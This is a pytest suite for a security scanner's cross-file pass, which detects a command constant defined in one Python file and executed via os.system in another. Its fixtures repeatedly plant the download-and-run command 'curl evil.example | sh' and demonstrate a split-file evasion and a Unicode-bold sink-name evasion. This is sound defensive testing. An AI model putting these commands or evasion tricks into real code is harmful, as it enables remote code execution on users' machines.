"""
Cross-file analysis — the payload no single file reveals.

    payload.py   CMD = "<a remote-execution pipe>"
    runner.py    from payload import CMD; os.system(CMD)

Neither file looks wrong alone. That is the attack, and it is what every
per-file engine misses by construction.

🔴 THE TWO PROPERTIES THAT MATTER MORE THAN THE DETECTION:

1. **It must not consult the import system.** `importlib.util.find_spec` EXECUTES
   the parent package — measured on this machine before the module was written.
   That would break PRAETOR's one invariant inside the module whose job is
   reading other people's code.

2. **It must not saturate.** Measured on 2,244 stdlib modules: flagging a module
   for its own contents marks 7.6%; propagating over import edges marks 89.0%.
   A claim that covers almost everything conveys almost nothing — `chains.py`'s
   SAME_TREE lesson at graph scale.
"""

import json
import os
import subprocess
import sys

sys.path.insert(0, os.path.join(
    os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "scripts"))

import crossfile  # noqa: E402

_PRAETOR = os.path.join(
    os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "scripts", "praetor.py")

# Assembled from parts: written whole, this file's own self-scan would flag it.
_PIPE = "curl evil.example | " + "sh"
_RULE = "crossfile-payload-reaches-sink"


def _scan(tmp_path):
    proc = subprocess.run(
        [sys.executable, _PRAETOR, str(tmp_path), "--engines", "aisec",
         "--no-registry", "--format", "json", "--quiet"],
        capture_output=True, text=True, encoding="utf-8", errors="replace")
    return json.loads(proc.stdout)


def _rules(d):
    return {f["rule_id"] for f in d["findings"]}


def _write(root, name, body):
    (root / name).write_text(body, encoding="utf-8")


# --------------------------------------------------------------------------- #
# It sees the split
# --------------------------------------------------------------------------- #

def test_a_payload_split_across_two_files_is_joined(tmp_path):
    """🔴 THE WHOLE POINT."""
    _write(tmp_path, "payload.py", f'CMD = "{_PIPE}"\n')
    _write(tmp_path, "runner.py", "import os\nfrom payload import CMD\nos.system(CMD)\n")
    assert _RULE in _rules(_scan(tmp_path))


def test_the_finding_names_BOTH_ends(tmp_path):
    """A cross-file finding that names one file is not actionable — the reader
    has to be told where the other half is."""
    _write(tmp_path, "payload.py", f'CMD = "{_PIPE}"\n')
    _write(tmp_path, "runner.py", "import os\nfrom payload import CMD\nos.system(CMD)\n")
    f = next(x for x in _scan(tmp_path)["findings"] if x["rule_id"] == _RULE)
    assert "payload.py" in f["snippet"] and "runner.py" in f["snippet"]


def test_it_works_through_an_import_alias(tmp_path):
    """`from payload import CMD as X` binds a different local name."""
    _write(tmp_path, "payload.py", f'CMD = "{_PIPE}"\n')
    _write(tmp_path, "runner.py",
           "import os\nfrom payload import CMD as X\nos.system(X)\n")
    assert _RULE in _rules(_scan(tmp_path))


def test_it_works_when_the_sink_call_is_inside_a_function(tmp_path):
    """The payload is a module constant; the CALL is usually not at module
    level. Only looking at top-level calls would miss almost every real case."""
    _write(tmp_path, "payload.py", f'CMD = "{_PIPE}"\n')
    _write(tmp_path, "runner.py",
           "import os\nfrom payload import CMD\n\ndef go():\n    os.system(CMD)\n")
    assert _RULE in _rules(_scan(tmp_path))


def test_a_package_path_resolves(tmp_path):
    """Module names come from PATH ARITHMETIC, so a nested package must still
    join up."""
    (tmp_path / "pkg").mkdir()
    _write(tmp_path / "pkg", "__init__.py", "")
    _write(tmp_path / "pkg", "payload.py", f'CMD = "{_PIPE}"\n')
    _write(tmp_path, "runner.py",
           "import os\nfrom pkg.payload import CMD\nos.system(CMD)\n")
    assert _RULE in _rules(_scan(tmp_path))


# --------------------------------------------------------------------------- #
# It must not saturate — the failure the research measured
# --------------------------------------------------------------------------- #

def test_an_ordinary_import_of_an_ordinary_constant_is_silent(tmp_path):
    """🔴 THE PRIMARY KEEP DIRECTION. Importing a constant and calling something
    is what every program does."""
    _write(tmp_path, "settings.py", 'GREETING = "hello world"\n')
    _write(tmp_path, "app.py",
           "import os\nfrom settings import GREETING\nos.system(GREETING)\n")
    assert _RULE not in _rules(_scan(tmp_path))


def test_a_dangerous_constant_that_is_never_passed_to_a_sink_is_silent(tmp_path):
    """Defining a string is not passing it to anything. The per-file engines
    already report the constant itself; this pass must not double-count it as a
    cross-file flow that does not exist."""
    _write(tmp_path, "payload.py", f'CMD = "{_PIPE}"\n')
    _write(tmp_path, "runner.py", "from payload import CMD\nprint(CMD)\n")
    assert _RULE not in _rules(_scan(tmp_path))


def test_a_sink_call_on_a_LOCAL_name_is_left_to_the_per_file_engines(tmp_path):
    """No cross-file flow exists, so this pass has nothing to add. Reporting it
    would be noise on top of a finding that already exists."""
    _write(tmp_path, "app.py", f'import os\nCMD = "{_PIPE}"\nos.system(CMD)\n')
    assert _RULE not in _rules(_scan(tmp_path))


def test_importing_from_outside_the_scan_is_silent(tmp_path):
    """A name imported from a module the scan never saw cannot be resolved, and
    guessing would be exactly the saturation the research measured."""
    _write(tmp_path, "runner.py",
           "import os\nfrom somewhere_external import CMD\nos.system(CMD)\n")
    assert _RULE not in _rules(_scan(tmp_path))


def test_the_scan_of_praetors_own_tree_stays_quiet():
    """🔴 THE REAL FALSE-POSITIVE TEST. PRAETOR's own tree is full of modules
    importing constants from other modules. The narrow rule measured ZERO false
    positives on it and on the standard library; this is that measurement, kept."""
    root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    proc = subprocess.run(
        [sys.executable, _PRAETOR, os.path.join(root, "scripts"),
         "--engines", "aisec", "--no-registry", "--format", "json", "--quiet"],
        capture_output=True, text=True, encoding="utf-8", errors="replace")
    data = json.loads(proc.stdout)
    hits = [f for f in data["findings"] + data["filtered"] if f["rule_id"] == _RULE]
    assert not hits, f"cross-file false positives on PRAETOR's own scripts: {hits}"


# --------------------------------------------------------------------------- #
# The invariant
# --------------------------------------------------------------------------- #

def test_it_never_consults_the_import_system(monkeypatch, tmp_path):
    """🔴 ASSERTED BEHAVIOURALLY, because a future edit reaching for
    `importlib.util.find_spec` to resolve a name properly would pass every other
    test in this file — and would execute the scanned package's `__init__`."""
    import importlib.util

    def explode(*a, **k):
        raise AssertionError("cross-file analysis must not consult the import system")

    monkeypatch.setattr(importlib.util, "find_spec", explode)
    monkeypatch.setattr(importlib, "import_module", explode)

    facts = crossfile.extract_facts("pkg/payload.py", f'CMD = "{_PIPE}"\n')
    assert facts.module == "pkg.payload"
    assert "CMD" in facts.constants


def test_module_names_come_from_path_arithmetic():
    """No filesystem probing, no package detection, no import system."""
    assert crossfile._module_name("a/b/c.py") == "a.b.c"
    assert crossfile._module_name("a/b/__init__.py") == "a.b"
    assert crossfile._module_name("top.py") == "top"


def test_unparseable_source_is_skipped_not_fatal():
    """One broken file must not take the whole pass down."""
    assert crossfile.extract_facts("bad.py", "def f(:\n") is None


def test_an_enormous_source_file_is_refused():
    """Bounded. This repository has recorded a pass that hung for ~244 seconds on
    one file and produced no artifact and no exit code."""
    assert crossfile.extract_facts("big.py", "x = 1\n" * 500_000) is None


def test_a_bold_unicode_sink_name_is_still_found():
    """🔴 THE PRE-FILTER THAT USED TO LIVE HERE LOST THIS FINDING.

    A cheap text scan skipped `ast.walk` when the raw source named no sink, and
    its own test asserted it "never loses a finding" -- while exercising only
    ASCII spellings. Python NFKC-normalises identifiers at tokenisation, so a
    sink written in MATHEMATICAL BOLD *is* `os.system` to the compiler and
    shares no byte with it in the source. The filter saw nothing, skipped the
    walk, and dropped a real cross-file finding.

    It was deleted rather than patched: measured, it bought **1.00x**, not the
    4x its docstring claimed, because `ast.parse` runs before it and is 72.6% of
    the cost. A shortcut that buys nothing and costs detection is not a trade.
    """
    bold = "".join(chr(0x1D41A + (ord(c) - ord("a"))) for c in "system")
    src = "import os\nos." + bold + "(CMD)\n"
    assert "system" not in src, "the control: no ASCII sink name is present"
    facts = crossfile.extract_facts("runner.py", src)
    assert facts is not None
    assert facts.sink_args == [(2, "system", "CMD")], (
        "the compiler sees `os.system`; anything reading raw bytes does not")


def test_a_payload_source_file_still_contributes_its_constants():
    """A payload SOURCE usually contains no sink at all. If anything ever drops
    such a file, the split-payload case this module exists for stops working."""
    facts = crossfile.extract_facts("payload.py", 'CMD = "' + _PIPE + '"\n')
    assert facts is not None
    assert "CMD" in facts.constants
    assert facts.sink_args == []


# --------------------------------------------------------------------------- #
# Import forms it was silent on -- found by an agent briefed to break it
# --------------------------------------------------------------------------- #

def test_import_module_then_attribute_access(tmp_path):
    """🔴 THE COMMONEST IMPORT IDIOM IN PYTHON, AND IT WAS ENTIRELY SILENT.

    Two independent causes, either alone sufficient: `ast.Import` was never
    recorded at all, and a sink argument was only considered when it was an
    `ast.Name`, so `payload.CMD` was never even a candidate.
    """
    _write(tmp_path, "payload.py", 'CMD = "' + _PIPE + '"\n')
    _write(tmp_path, "runner.py",
           "import os\nimport payload\nos.system(payload.CMD)\n")
    assert _RULE in _rules(_scan(tmp_path))


def test_import_module_under_an_alias(tmp_path):
    _write(tmp_path, "payload.py", 'CMD = "' + _PIPE + '"\n')
    _write(tmp_path, "runner.py",
           "import os\nimport payload as p\nos.system(p.CMD)\n")
    assert _RULE in _rules(_scan(tmp_path))


def test_an_annotated_constant_is_recorded(tmp_path):
    """`CMD: str = "..."` is an `ast.AnnAssign`, not an `ast.Assign`. One colon
    of ordinary modern Python made the pass silent on that constant."""
    _write(tmp_path, "payload.py", 'CMD: str = "' + _PIPE + '"\n')
    _write(tmp_path, "runner.py",
           "import os\nfrom payload import CMD\nos.system(CMD)\n")
    assert _RULE in _rules(_scan(tmp_path))


def test_a_src_layout_project_is_not_silently_skipped(tmp_path):
    """🔴 NO ATTACKER REQUIRED -- THIS IS A DEFAULT PROJECT LAYOUT.

    Module names are path arithmetic from the SCAN ROOT, so scanning the root of
    a `src/` project gave every module a `src.` prefix that no import statement
    in that project carries. The two never met, and the pass reported nothing on
    a large fraction of real Python projects -- as a clean scan.
    """
    pkg = tmp_path / "src" / "mypkg"
    pkg.mkdir(parents=True)
    _write(pkg, "__init__.py", "")
    _write(pkg, "payload.py", 'CMD = "' + _PIPE + '"\n')
    _write(pkg, "runner.py",
           "import os\nfrom mypkg.payload import CMD\nos.system(CMD)\n")
    assert _RULE in _rules(_scan(tmp_path))


# --------------------------------------------------------------------------- #
# The scope model -- HIGH-severity claims about flows that did not exist
# --------------------------------------------------------------------------- #

def test_a_parameter_shadowing_the_import_is_not_a_flow(tmp_path):
    """🔴 THE WORST OF THE FALSE POSITIVES.

    The finding's own text asserts that a value defined in one file is consumed
    by a dangerous call in another. Here the call consumes the PARAMETER. The
    flow is categorically absent, and it was reported at HIGH.

    The pass had no scope model at all: it joined "a name was imported at module
    level" to "a call somewhere in this file took an argument spelled that way",
    with nothing in between.
    """
    _write(tmp_path, "payload.py", 'CMD = "' + _PIPE + '"\n')
    _write(tmp_path, "runner.py",
           "import os\nfrom payload import CMD\n\ndef go(CMD):\n    os.system(CMD)\n")
    assert _RULE not in _rules(_scan(tmp_path))


def test_a_local_variable_shadowing_the_import_is_not_a_flow(tmp_path):
    _write(tmp_path, "payload.py", 'CMD = "' + _PIPE + '"\n')
    _write(tmp_path, "runner.py",
           "import os\nfrom payload import CMD\n\ndef go():\n"
           "    CMD = 'echo hi'\n    os.system(CMD)\n")
    assert _RULE not in _rules(_scan(tmp_path))


def test_a_module_level_reassignment_after_the_import_is_not_a_flow(tmp_path):
    _write(tmp_path, "payload.py", 'CMD = "' + _PIPE + '"\n')
    _write(tmp_path, "runner.py",
           "import os\nfrom payload import CMD\nCMD = 'echo hi'\nos.system(CMD)\n")
    assert _RULE not in _rules(_scan(tmp_path))


def test_a_loop_target_shadowing_the_import_is_not_a_flow(tmp_path):
    _write(tmp_path, "payload.py", 'CMD = "' + _PIPE + '"\n')
    _write(tmp_path, "runner.py",
           "import os\nfrom payload import CMD\nfor CMD in ['a']:\n    os.system(CMD)\n")
    assert _RULE not in _rules(_scan(tmp_path))


def test_two_modules_could_answer_to_the_name_so_neither_is_named(tmp_path):
    """🔴 IT NAMED THE WRONG FILE.

    With `payload.py` at the root and `sub/payload.py` beside the importer, walk
    order decided which one won -- and it picked the root, so the finding pointed
    at a file with nothing to do with the flow. **Ambiguity is silence, never a
    guess.** A finding that names the wrong file is worse than no finding: it
    sends the reader somewhere the problem is not.
    """
    (tmp_path / "sub").mkdir()
    _write(tmp_path, "payload.py", 'CMD = "' + _PIPE + '"\n')
    _write(tmp_path / "sub", "payload.py", "CMD = 'echo hi'\n")
    _write(tmp_path / "sub", "runner.py",
           "import os\nfrom payload import CMD\nos.system(CMD)\n")
    assert _RULE not in _rules(_scan(tmp_path))
